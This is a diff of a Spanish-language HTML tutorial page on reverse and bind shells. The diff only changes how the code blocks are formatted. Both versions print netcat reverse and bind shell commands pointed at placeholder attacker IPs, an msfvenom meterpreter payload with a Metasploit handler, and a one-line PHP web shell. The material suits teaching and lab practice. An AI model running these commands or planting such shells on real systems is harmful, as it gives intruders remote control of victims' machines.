@@ -741,11 +741,11 @@
 <p><strong><u>Ejemplo</strong></u></p>
 <p>Netcat es una herramienta que soporta múltiples sistemas oprativos, permite lecturas y escrituras a través de la red. </p>
 <p>El atacante utiliza Netcat para escuchar en el puerto 4444:</p>
-<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
-</code></pre></div>
-<p>A continuación, el objetivo o víctima ejecuta un <em>payload</em> para conectarse de nuevo a la máquina del atacante:
-<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
-</code></pre></div></p>
+<pre><code class="language-bash">nc -lvp 4444
+</code></pre>
+<p>A continuación, el objetivo o víctima ejecuta un <em>payload</em> para conectarse de nuevo a la máquina del atacante:</p>
+<pre><code class="language-bash">nc [atacante_IP] 4444 -e /bin/bash
+</code></pre>
 <p>Esta configuración permite al atacante controlar el intérprete de comandos de la víctima a través de la red.</p>
 <hr />
 <h3 id="bind-shell">Bind shell</h3>
@@ -762,11 +762,11 @@
 </ul>
 <p><strong><u>Ejemplo</strong></u></p>
 <p>La máquina destino utiliza Netcat para configurar un bind shell:</p>
-<p><div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
-</code></pre></div>
-A continuación, el atacante se conecta a la IP y al puerto de la máquina objetivo:
-<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>IP_objetivo<span class="o">]</span><span class="w"> </span><span class="m">4444</span>
-</code></pre></div></p>
+<pre><code class="language-bash">nc -lvp 4444 -e /bin/bash
+</code></pre>
+<p>A continuación, el atacante se conecta a la IP y al puerto de la máquina objetivo:</p>
+<pre><code class="language-bash">nc [IP_objetivo] 4444
+</code></pre>
 <hr />
 <p><strong>Reverse shells VS Bind shells</strong></p>
 <ul>
@@ -791,9 +791,9 @@ A continuación, el atacante se conecta a la IP y al puerto de la máquina objet
 <p><strong>Metasploit Multi/Handler</strong>: La herramienta <code>multi/handler</code> de Metasploit está diseñada para gestionar listeners para varios tipos de payloads, incluyendo reverse shells, proporcionando flexibilidad y características más allá de lo que ofrece Netcat.</p>
 </li>
 </ul>
-<p><strong>Ejemplo de listener de Netcat</strong>:
-<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="c1"># escucha en el puerto 4444 cualquier conexión entrante</span>
-</code></pre></div></p>
+<p><strong>Ejemplo de listener de Netcat</strong>:</p>
+<pre><code class="language-bash">nc -lvp 4444 # escucha en el puerto 4444 cualquier conexión entrante
+</code></pre>
 <hr />
 <h3 id="payloads"><strong>Payloads</strong></h3>
 <ul>
@@ -838,14 +838,14 @@ A continuación, el atacante se conecta a la IP y al puerto de la máquina objet
 <ul>
 <li>
 <p><strong>Atacante (Listener)</strong>:
-   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
-</code></pre></div>
+   <code>bash
+   nc -lvp 4444</code>
    La opción <strong>-l</strong> le indica a netcat que espere una conexión, <strong>-v</strong> activa la salida detallada del comando, <strong>-n</strong> impide que las conexiones hagan uso de una búsqueda DNS (no se resolverá ningún nombre, se utilizarán IPs). Finalmente la opción <strong>-p</strong> indica el puerto en el que se escuchará en espera de conexciones entrantes.</p>
 </li>
 <li>
 <p><strong>Víctima (Payload)</strong>:
-   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
-</code></pre></div></p>
+   <code>bash
+   nc [atacante_IP] 4444 -e /bin/bash</code></p>
 <p>Se podría utilizar cualquier puerto <em>libre</em> para escuchar.</p>
 </li>
 </ul>
@@ -854,24 +854,24 @@ A continuación, el atacante se conecta a la IP y al puerto de la máquina objet
 <p><strong>Metasploit Reverse TCP Payload</strong>:</p>
 <ul>
 <li>Generar un payload:
-  <div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>attacker_IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>reverse_shell.exe
-</code></pre></div></li>
+  <code>bash
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o reverse_shell.exe</code></li>
 <li><strong>Escucha en Metasploit</strong>:
-  <div class="highlight"><pre><span></span><code>msfconsole
-use<span class="w"> </span>exploit/multi/handler
-<span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span>
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-exploit
-</code></pre></div></li>
+  <code>bash
+  msfconsole
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST [atacante_IP]
+  set LPORT 4444
+  exploit</code></li>
 </ul>
 </li>
 <li>
 <p><strong>Shell Web PHP</strong>:</p>
 <ul>
 <li>Crea una shell web PHP básica y súbela a un servidor web vulnerable.
-  <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
-</code></pre></div></li>
+  <code>php
+  &lt;?php echo shell_exec($_GET['cmd']); ?&gt;</code></li>
 <li>Accede a la web shell navegando a <code>http://victima.com/shell.php?cmd=whoami</code>.</li>
 </ul>
 </li>
